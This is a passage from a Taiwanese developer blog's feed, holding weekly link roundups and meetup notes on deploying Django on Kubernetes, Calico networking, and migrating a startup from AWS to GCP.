&lt;p&gt;Platforms like Kubernetes assume that each container (pod) has a unique, routable IP inside the cluster. The advantage of this model is that it reduces the complexity of doing port mapping.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最近剛好遇到需要在 Flask 上使用 Celery 需求，於是參考了一下。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/miguelgrinberg/flask-celery-example"&gt;GitHub - miguelgrinberg/flask-celery-example: This repository contains the example code for my blog article Using Celery with Flask.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This repository contains the example code for my blog article Using Celery with Flask.  For details on how this all works, see my article Using Celery with Flask.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.miguelgrinberg.com/post/using-celery-with-flask"&gt;Using Celery With Flask - miguelgrinberg.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The topic of running background tasks is complex, and because of that there is a lot of confusion around it. I have tackled it in my Mega-Tutorial, later in my book, and then again in much more detail in my REST API training video.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;scrum&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://guntherverheyen.com/2014/11/26/scrum-master-a-manager/"&gt;Scrum Master – A Manager | Ullizee&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Traditionally an individual is declared a ‘manager’ when having hierarchical control over other individuals. A traditional manager exerts power.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這篇介紹了 Scrum Master 是個怎樣的角色，基本上這個角色應該是沒有實權的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cyberrob.github.io/scrum/asia/taiwan/2017/07/01/scrum-in-asia-translated.html"&gt;Scrum 在亞洲行不通 | Thinking in Life&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇文章非常詳細的說明了為什麼 Scrum 在亞洲不普遍而且無法普遍的原因，我覺得挺中肯的。  &lt;/li&gt;
&lt;li&gt;原文：&lt;a href="https://enterprisepathtoagility.com/scrum-does-not-work-here-in-asia-72d7bccccb4d"&gt;Scrum does not work here in Asia – Enterprise Agility&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="docker"></category><category term="k8s"></category><category term="python"></category><category term="scrum"></category></entry><entry><title>GCPUG.tw #27</title><link href="https://blog.m157q.tw/posts/2017/07/05/gcpug-tw-27/" rel="alternate"></link><published>2017-07-05T21:46:56+08:00</published><updated>2017-07-05T21:46:56+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-07-05:posts/2017/07/05/gcpug-tw-27/</id><summary type="html">&lt;p&gt;Event link: &lt;a href="https://gcpugtw.kktix.cc/events/meetup201707"&gt;https://gcpugtw.kktix.cc/events/meetup201707&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Using Kubernetes to deploy Django in GCP&lt;/h2&gt;
&lt;p&gt;Speaker: Walter Liu&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/walterliu7/using-kubernetes-to-deploy-django-in-gcp"&gt;https://www.slideshare.net/walterliu7/using-kubernetes-to-deploy-django-in-gcp&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/docs/tutorials/stateful-application/basic-stateful-set/"&gt;Statefulset&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Beta feature since k8s 1.7  &lt;/li&gt;
&lt;li&gt;Sharding Service  &lt;/li&gt;
&lt;li&gt;還是得設定 service 給他，不然 DNS lookup 會找不到  &lt;/li&gt;
&lt;li&gt;Like deployment with static POD name  &lt;/li&gt;
&lt;li&gt;Usage: Sharded service  &lt;ul&gt;
&lt;li&gt;redis  &lt;/li&gt;
&lt;li&gt;memcached  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other usage: static volume  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Secret / ConfigMap  &lt;/li&gt;
&lt;li&gt;Service  &lt;/li&gt;
&lt;li&gt;Ingress  &lt;ul&gt;
&lt;li&gt;Global Load Balancer  &lt;/li&gt;
&lt;li&gt;No firewall ability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;k8s has no crontab (currently)  &lt;ul&gt;
&lt;li&gt;Use Celery  &lt;/li&gt;
&lt;li&gt;Use crontab in Google App Engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;k8s + GCP Load Balancer  &lt;/li&gt;
&lt;li&gt;Cluster creation steps  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;kubectl create -f web_secretes.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f cache_stateful_set.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;./titan_control deploy prod&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Like =&amp;gt; &lt;code&gt;kubectl apply -f prod_web_deploy.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f service.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f ingress.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;gsutil mb -l asia gs://static.example.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;要記得檢查該開啟來的 service 有沒有開起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;遇到的問題  &lt;ul&gt;
&lt;li&gt;Templating  &lt;ul&gt;
&lt;li&gt;Use Python Jinja to do k8s templating  &lt;/li&gt;
&lt;li&gt;Someone had suggested me to use &lt;a href="https://github.com/kubernetes/helm"&gt;HELM&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Show templating example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;深入 Kubernetes Network，Calico Overlet Network 介紹&lt;/h2&gt;
&lt;p&gt;Speaker: 光光&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/IsaacTseng/20170705-kubernetes-with-calico"&gt;https://www.slideshare.net/IsaacTseng/20170705-kubernetes-with-calico&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;k8s cluster network  &lt;ul&gt;
&lt;li&gt;inside a pod  &lt;ul&gt;
&lt;li&gt;App &amp;amp; DB connection with local network  &lt;ul&gt;
&lt;li&gt;因為在同個 Pod 走內網，所以不會有 performance 的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pod-to-service  &lt;ul&gt;
&lt;li&gt;Conneciton via Service  &lt;ul&gt;
&lt;li&gt;不會有啥太大的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;external-to-service  &lt;ul&gt;
&lt;li&gt;Conneciton via Service  &lt;ul&gt;
&lt;li&gt;不會有啥太大的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pod-to-pod  &lt;ul&gt;
&lt;li&gt;Pod &amp;amp; Pod may in different hosts  &lt;/li&gt;
&lt;li&gt;How to connect two Pods?  &lt;/li&gt;
&lt;li&gt;這會是今天主要探討的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Overlay network  &lt;ul&gt;
&lt;li&gt;Flannel  &lt;ul&gt;
&lt;li&gt;CoreOS 使用 &lt;a href="https://github.com/coreos/flannel"&gt;Flannel&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;All pockets go through Flannel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance  &lt;ul&gt;
&lt;li&gt;Overlay vs Underlay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User story  &lt;ul&gt;
&lt;li&gt;IPsec Tunneling  &lt;ul&gt;
&lt;li&gt;在內部網路仍然使用 IPsec Tunneling 導致 throughput Performance 下降了約 80%  &lt;/li&gt;
&lt;li&gt;為了想要解決這個問題，所以用上了 Calico  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rancher.com/rancher-os/"&gt;RancherOS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rancher/os"&gt;https://github.com/rancher/os&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico"&gt;Calico&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.projectcalico.org//"&gt;https://www.projectcalico.org//&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Features  &lt;ul&gt;
&lt;li&gt;Use etcd  &lt;/li&gt;
&lt;li&gt;BGP Routing  &lt;/li&gt;
&lt;li&gt;Pod get routings to other Pod  &lt;/li&gt;
&lt;li&gt;Packets not over Calico  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to use  &lt;ul&gt;
&lt;li&gt;Kubelet settings: &lt;code&gt;--network-plugin=cni&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CoreOS 的相容性不太高，要做網路層的實體 binding 的話會比較複雜，可能需要多注意一點。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/"&gt;Daemon Set&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f calico.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl get pod --namespace=kube-system&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;為什麼選 Calico 不選 Flannel?  &lt;ul&gt;
&lt;li&gt;因為 Flannel 是 Overlay Network，而且不在 CoreOS 裏面用的話會很麻煩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼 GCP 比 Calico 更好？  &lt;ul&gt;
&lt;li&gt;GKE 是執行在 GCE 裏面，然後 Network 是直接跟 GCE 作 bridge，所以 Pod 之間的溝通會很方便。  &lt;/li&gt;
&lt;li&gt;但會有個問題，如果要做一些安全性的限制的話會比較麻煩，因為大家的網路都是 bridge 在一起，所以比較難針對這點去做限制。  &lt;/li&gt;
&lt;li&gt;如果有這方面的考量的話，建議不要直接用 GKE，但可以試著在 GCE 上安裝 Calico 來使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Calico node 會去處理他擁有的 IP，寫在 etcd 裡頭。BGP peering 之後，IP 就可以共享。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BGP Peering  &lt;ul&gt;
&lt;li&gt;可以透過 BGP Peering 的方式，把 Pod 之間相連起來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有興趣的人也可以去玩一下 GCP 上的 &lt;a href="https://cloud.google.com/container-optimized-os/docs/"&gt;Container-Optimized OS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;從 AWS 轉移到 GCP，一個新創團隊搬家的故事: TABLEAPP Architecture Story&lt;/h2&gt;
&lt;p&gt;Speaker: 陳彥文&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story"&gt;https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;幫一家新創公司解決 Server 維護上的問題  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找出問題  &lt;ul&gt;
&lt;li&gt;展開完整架構  &lt;/li&gt;
&lt;li&gt;列出操遇到的狀況  &lt;/li&gt;
&lt;li&gt;儘可能開啟所有 log  &lt;/li&gt;
&lt;li&gt;分析狀況來源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;選定改善目標及檢驗標準  &lt;ul&gt;
&lt;li&gt;降低成本  &lt;/li&gt;
&lt;li&gt;資源使用效率  &lt;/li&gt;
&lt;li&gt;減緩月支出成長速度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Benefits of Docker  &lt;ul&gt;
&lt;li&gt;Version Control  &lt;ul&gt;
&lt;li&gt;push code and build  &lt;/li&gt;
&lt;li&gt;every commit has its own images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lightweight  &lt;/li&gt;
&lt;li&gt;Isolation  &lt;/li&gt;
&lt;li&gt;Portable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How about K8S on EC2?  &lt;ul&gt;
&lt;li&gt;Deploy kubernets on EC2  &lt;ul&gt;
&lt;li&gt;Maintain Kubernetes yourself  &lt;ul&gt;
&lt;li&gt;Install  &lt;/li&gt;
&lt;li&gt;Testing  &lt;/li&gt;
&lt;li&gt;Updating  &lt;/li&gt;
&lt;li&gt;and ...  &lt;/li&gt;
&lt;li&gt;Kubernetes updates really fast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Handle auto-scaling manually  &lt;ul&gt;
&lt;li&gt;Remove pods before remove ec2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using CI to deploy image  &lt;/li&gt;
&lt;li&gt;Set up logging and monitoring policy  &lt;/li&gt;
&lt;li&gt;Integrate AWS resource and Kubernetes manually  &lt;ul&gt;
&lt;li&gt;It must be scalabel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;It sucks...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Kubernetes on GCP is awesome  &lt;ul&gt;
&lt;li&gt;GKE  &lt;ul&gt;
&lt;li&gt;Easy  &lt;/li&gt;
&lt;li&gt;Full managed  &lt;ul&gt;
&lt;li&gt;even update kubernetes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Logging and Monitoring support (stackdrive)  &lt;/li&gt;
&lt;li&gt;Automatic and configurable cluster scaling  &lt;/li&gt;
&lt;li&gt;Google Cloud Platform resource integration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/17"&gt;GCP&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/18"&gt;Inside k8s&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/19"&gt;Deployment&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/20"&gt;Log Collection&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這架構挺棒的，雖然不大，但把可以用的都用上了，可以學習一下。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cost and Usage  &lt;ul&gt;
&lt;li&gt;Hybrid 時期的 cost 有比較高  &lt;/li&gt;
&lt;li&gt;後來做完 migration 到 GCP 之後，cost 比在 AWS 上降一半，然後 handle 的 request 量多 5 倍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;CloudCDN is really fast  &lt;ul&gt;
&lt;li&gt;very low latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lower price  &lt;ul&gt;
&lt;li&gt;based on new arch, we save 40% cost  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平台終究只是工具，人才是最大的關鍵。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>Y2017W26</title><link href="https://blog.m157q.tw/posts/2017/07/03/y2017w26/" rel="alternate"></link><published>2017-08-28T22:44:18+08:00</published><updated>2017-08-28T22:44:18+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-07-03:posts/2017/07/03/y2017w26/</id><summary type="html">&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.docker.com/2017/06/announcing-docker-17-06-community-edition-ce/"&gt;Announcing Docker 17.06 Community Edition (CE) - Docker Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gae&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://eshlox.net/2015/01/16/google-app-engine-importerror-no-module-named-google-appengine-dist27-threading/"&gt;Google App Engine: ImportError: No module named google.appengine.dist27.threading&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;network&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.s10g.tw/posts/2017/06/28/paper-study-many-to-one/"&gt;Solomon's Notebook – [Paper Study] Mant-to-one, many-to-many protocol&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.s10g.tw/posts/2017/06/28/paper-study-ACT-AP/"&gt;Solomon's Notebook – [Paper Study] ACT-AP&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;prgoramming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://juejin.im/post/59527e97f265da6c436700fe"&gt;用一个简易的 web chat 说说 Python、Golang、Nodejs 的异步 - 掘金&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dokelung.me/category/python/dont-reinvent-sandwich/"&gt;dokelung.me&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇講 Python 的 decorator 講的滿清楚的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dokelung.me/category/python/dont-reinvent-sandwich-2/"&gt;dokelung.me&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇在講 context manager  &lt;/li&gt;
&lt;li&gt;也挺清楚的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mike.zwobble.org/2013/05/adding-git-or-hg-or-svn-dependencies-in-setup-py/"&gt;Adding git (or hg, or svn) dependencies in setup.py (Python) – Mike's corner of the web&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Update: the behaviour of pip has changed, meaning that the option --process-dependency-links is required when running pip install.  You can specify dependencies for your Python project in setup.py by referencing packages on the Python Package Index (PyPI).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python-future.org/"&gt;Easy, clean, reliable Python 2/3 compatibility — Python-Future  documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;python-future is the missing compatibility layer between Python 2 and Python 3. It allows you to use a single, clean Python 3.x-compatible codebase to support both Python 2 and Python 3 with minimal overhead.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0Bz8Kfu_94VuJcVo1a1drQjhReU0/view"&gt;pycontw2017_talk_dont_reinvent_sandwich.pptx - Google Drive&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;講 contextlib  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kb.hitcon.org/post/162189657177/%E5%9C%8B%E7%B6%B2%E4%B8%AD%E5%BF%83-cdx-%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB#_=_"&gt;HITCON Knowledge Base - 國網中心 CDX 經驗分享&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來國網中心也開始辦給學生的資安競賽了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Lawyer/M.1498300294.A.79B.html"&gt;Re: [問題] 使用 MBA 撰寫存證信函格式一直跑掉 - 看板 Lawyer - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像真的需要更多這種可以幫其他產業在資訊處理上提升其效率的人們  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/csterryliu/Legal-Attest-Letter-Generator-TW"&gt;GitHub - csterryliu/Legal-Attest-Letter-Generator-TW: 台灣郵局存證信函產生器。A tool for creating a legal attest letter of Taiwan.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lyenliang/Legal-Attest-Letter-Generator-TW-Web"&gt;GitHub - lyenliang/Legal-Attest-Letter-Generator-TW-Web: Web version of https://github.com/csterryliu/Legal-Attest-Letter-Generator-TW&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://flipedu.parenting.com.tw/article/3565"&gt;要不是兩個孩子，我還以為勤能補拙是對的！-翻轉教育-親子天下網站&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用功要用在有興趣的地方，世界那麼大，可能性很多，不是只有讀書考試而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="docker"></category><category term="gae"></category><category term="life"></category><category term="network"></category><category term="prgoramming"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category></entry><entry><title>Y2017W25</title><link href="https://blog.m157q.tw/posts/2017/06/26/y2017w25/" rel="alternate"></link><published>2017-08-28T22:15:32+08:00</published><updated>2017-08-28T22:15:32+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-06-26:posts/2017/06/26/y2017w25/</id><summary type="html">&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2017/06/22/improving-critical-infrastructure-rollouts/"&gt;Improving Critical Infrastructure Rollouts | Labs&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Spotify 分享 2014 年開始用 Docker 遇到的問題  &lt;/li&gt;
&lt;li&gt;開發了 Tsunami 這工具來做漸進式升級  &lt;/li&gt;
&lt;li&gt;預計日後開源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;flask&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/31637774/how-can-i-log-request-post-body-in-flask"&gt;python - How can I log request POST body in Flask? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/10434599/how-to-get-data-received-in-flask-request"&gt;python - How to get data received in Flask request - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/06/Google-Cloud-Platform-comes-to-Singapore.html"&gt;Google Cloud Platform Blog: New Singapore GCP region – open now&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 開了新加坡的機房  &lt;/li&gt;
&lt;li&gt;Region name 是 asia-southeast1  &lt;/li&gt;
&lt;li&gt;是說旋轉拍賣也用 GCP 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ihower.tw/blog/archives/8740"&gt;Git worktree: 同時開多個工作目錄 | ihower { blogging }&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.acolyer.org/2017/06/14/system-programming-in-rust-beyond-safety/amp/"&gt;System programming in Rust: beyond safety – the morning paper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;論文等級的 Rust 推坑文？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.aweimeow.tw/2017/06/17/The-Meaning-of-Underscores-in-Python/"&gt;The Meaning of Underscores in Python | Aweimeow's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹的挺清楚的  &lt;/li&gt;
&lt;li&gt;看了這篇才知道有 dunders 這個詞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.python.org/2017/06/python-362rc1-is-now-available-for.html"&gt;Python Insider: Python 3.6.2rc1 is now available for testing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/coodict/python3-in-one-pic"&gt;coodict/python3-in-one-pic: Learn python3 in one picture.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/plotly/plotly.py"&gt;GitHub - plotly/plotly.py: An interactive, browser-based graphing library for Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ageitgey/face_recognition"&gt;GitHub - ageitgey/face_recognition: The world's simplest facial recognition api for Python and the command line&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/thtrieu/darkflow"&gt;GitHub - thtrieu/darkflow: Translate darknet to tensorflow. Load trained weights, retrain/fine-tune using tensorflow, export constant graph def to mobile devices&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://m.douban.com/note/292972354/"&gt;網絡新詞掃盲科普帖&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國網民真的很會創造新的網路辭彙...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://keeat.pixnet.net/blog/post/442257005-%E6%99%B4%E5%85%89%E5%B8%82%E5%A0%B4%E7%BE%8E%E9%A3%9F%E5%A4%A7%E9%9B%86%E5%90%88(%E6%87%B6%E4%BA%BA%E5%8C%85)(%E6%9B%B4%E6%96%B0%E8%87%B32017.1.10)"&gt;晴光市場美食大集合(懶人包)(更新至2017.1.10) @ 接力吃下去 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「晴光市場以前是以賣高檔的舶來品聞名的」  &lt;/li&gt;
&lt;li&gt;竟然啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://crossing.cw.com.tw/blogTopic.action?id=505&amp;amp;nid=8179"&gt;為什麼我建議「天然獨」的台灣大學生，都該去參加中國「統戰團」？ ｜ 讀者投書 ｜ 換日線 Crossing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;我覺得還不錯呀  &lt;/li&gt;
&lt;li&gt;但是底下留言又崩潰了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.goeducation.com.tw/%E3%80%90%E7%B7%9A%E4%B8%8A%E8%8B%B1%E6%96%87%E5%AD%B8%E7%BF%92%E3%80%91chips-%E6%98%AF%E6%B4%8B%E8%8A%8B%E7%89%87%E9%82%84%E6%98%AF%E8%96%AF%E6%A2%9D-%E8%8B%B1%E3%80%81%E7%BE%8E%E5%BC%8F%E8%8B%B1.html"&gt;【線上英文學習】Chips 是洋芋片還是薯條? 英、美式英語大剖析! - GoEducation 菲律賓遊學代辦&lt;/a&gt;  &lt;ul&gt;
